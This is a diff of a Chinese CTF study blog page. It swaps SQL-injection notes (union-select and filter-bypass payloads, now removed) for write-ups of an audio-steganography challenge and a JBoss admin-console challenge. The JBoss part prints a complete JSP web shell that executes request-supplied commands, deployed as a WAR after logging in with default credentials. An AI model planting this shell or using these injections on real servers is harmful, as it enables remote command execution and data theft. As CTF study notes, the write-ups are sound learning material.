@@ -332,6 +332,10 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
+                            <a href="/tags/misc/">
+                                <span class="chip bg-color">misc</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -353,7 +357,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-17
+                    2021-09-30
                 </div>
                 
 
@@ -450,55 +454,51 @@
 <p>​										为路径，只能在该路径下写入写出</p>
 <p><strong>show variables like “secure_file_priv”</strong>  查看</p>
 <p>Linux   – &gt; /tmp</p>
-<h2 id="SQL注入类"><a class="header-anchor" href="#SQL注入类">¶</a>SQL注入类</h2>
+<h2 id="绿城杯——MISC"><a class="header-anchor" href="#绿城杯——MISC">¶</a>绿城杯——MISC</h2>
 <blockquote>
-<p>常常出现查询框、登录框、注册框等等，但凡涉及到数据库操作，都成为SQL注入</p>
-<p>一般SQL注入题目都会有响应过滤，不会直接使用基础payload，所以要根据规则，手动输入进行解答</p>
+<p>[warmup] 音频隐写</p>
 </blockquote>
-<p>解题工具：BurpSuite、hackbar等</p>
-<p>解题方法：</p>
-<ol>
-<li>判断注入类型（整形、字符串型）</li>
-<li>判断过滤条件（过滤了哪些关键字）</li>
-<li>构造基础payload</li>
-<li>获取关键数据（执行payload获取数据库关键数据）</li>
-</ol>
-<p>注：过滤解法</p>
-<ol>
-<li>
-<p>过滤关键词处理方法：关键词双写(selselectect)，关键字大小写(SeLEcT),关键字编码，关键字替代，关键字分割</p>
-</li>
-<li>
-<p>过滤关键字符处理方法：字符替换（空格变成/**/或使用括号注入法），字符编码</p>
-</li>
-</ol>
-<p>联合查询注入过程</p>
-<ol>
-<li>
-<p>判断原有查询语句的<strong>列数</strong></p>
-<p>select company,ordernumber from 表 order by 1   （注：数值累加，直到报错后，得到原先库的列数）</p>
-</li>
-<li>
-<p>使原有查询语句的结果为空</p>
-<p><a target="_blank" rel="noopener" href="http://localhost/sqleasy/news.php?newsid=0">http://localhost/sqleasy/news.php?newsid=0</a> （注：防止原有数据干扰）</p>
-</li>
-<li>
-<p>判断数据输出位置（在2.4位置输出）</p>
-<p><a target="_blank" rel="noopener" href="http://localhost/sqleasy/news.php?newsid=0">http://localhost/sqleasy/news.php?newsid=0</a> union select 1,<strong>2</strong>,3,<strong>4</strong></p>
-</li>
-<li>
-<p>使用union语句拼接（将user信息与database信息输出）</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqleasy/news.php?newsid=0">http://127.0.0.1/sqleasy/news.php?newsid=0</a> union select 1,<strong>(select user())</strong>,3,<strong>database()</strong>（注：database（）获取库名）</p>
-</li>
-</ol>
-<p>得到database（）后，一步步搜索关于flag信息（group_concat函数，让所有信息整合在一行）</p>
-<p>将原先select 1,<strong>(select user())</strong>,3,<strong>database()</strong>，改为select 1,2,3,xxxxx.</p>
-<ol>
-<li>数据库名：select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</li>
-<li>表名：select group_concat(TABLE_NAME) from information_schema.TABLE where TABLE_SCHEMA=‘数据库名’</li>
-<li>列名： select group_concat(column_NAME) from information_schema.columns where TABLE_SCHEMA=‘数据库名’ and table_name=‘表名’</li>
-<li>值：select group_concat(列名) from 数据库名.表名</li>
-</ol>
+<p>将音频丢到Audacity 中</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215544.png" alt=""></p>
+<p>拉到音频后面，听到一串杂音</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215910.png" alt=""></p>
+<p>首先这之中的点不像摩斯电码，所以考虑看频谱图</p>
+<p>点击左上面的倒三角，选择频谱图</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215726.png" alt=""></p>
+<p>flag就在这边</p>
+<h2 id="长安杯——JBOSS漏洞"><a class="header-anchor" href="#长安杯——JBOSS漏洞">¶</a>长安杯——JBOSS漏洞</h2>
+<blockquote>
+<p>实际上没有做出来，只是后面复盘的时候发现其实还好，也就照葫芦画瓢</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/5a76f13809eb452aaa7583d2176ba9c3.jpg#pic_center" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221344.png" alt=""></p>
+<p>进入Administration Console</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221447.png" alt=""></p>
+<p>这边我第一次就admin admin进去了</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221530.png" alt=""></p>
+<p>第一次看到这个界面我以为没啥用，不过后面再看别人wp里面的时候就发现问题了</p>
+<p>看到这个界面找到一个上传war压缩包的地方，Jboss漏洞考察的就是Jboss 5.x/6.x admin-Console后台部署war包相关的知识。</p>
+<p>漏洞见下：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103899123?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-4&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_36119192/article/details/103899123?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-4&amp;spm=1001.2101.3001.4242</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token operator">&lt;</span><span class="token operator">%</span>
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token operator">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        java<span class="token operator">.</span>io<span class="token operator">.</span>InputStream in <span class="token operator">=</span> Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword type-declaration">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>          
+        byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          
+        out<span class="token operator">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            out<span class="token operator">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword type-declaration">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          
+        <span class="token punctuation">&#125;</span>
+        out<span class="token operator">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
+<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>生成war包</p>
+<p><img src="https://img-blog.csdnimg.cn/14576a4757b3466495cc993853e353de.png" alt=""></p>
+<p>然后上传</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930222156.png" alt=""></p>
+<p>之后传参，找出后台文件</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930222231.png" alt=""></p>
+<p>之后cat</p>
+<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/AppData/Roaming/Typora/typora-user-images/image-20210930222253970.png" alt=""></p>
 
                 
             </div>
@@ -525,7 +525,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Lim135.github.io/2021/09/17/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">http://Lim135.github.io/2021/09/17/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a>
+                    <a href="http://Lim135.github.io/2021/09/30/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">http://Lim135.github.io/2021/09/30/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -571,6 +571,10 @@
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
+                                <a href="/tags/misc/">
+                                    <span class="chip bg-color">misc</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -614,9 +618,68 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/09/30/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一些些web的做题记录——持续更新">
+                        
+                        <span class="card-title">一些些web的做题记录——持续更新</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            边看边做
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category">
+                                    攻防
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">做题记录</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/09/23/%E4%B8%8D%E6%B7%B1%E5%85%A5%E8%80%8C%E6%B5%85%E5%87%BA%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
                     <div class="card-image">
@@ -634,9 +697,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -658,59 +721,6 @@
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/09/15/Crypto-%E7%99%BD%E5%AB%96%E8%AE%B0%E5%BD%95/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Crypto_白嫖记录">
-                        
-                        <span class="card-title">Crypto_白嫖记录</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            随便谈谈RSA
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-15
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category">
-                                    攻防
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Crypto/">
-                        <span class="chip bg-color">Crypto</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-                        <span class="chip bg-color">学习记录</span>
                     </a>
                     
                 </div>
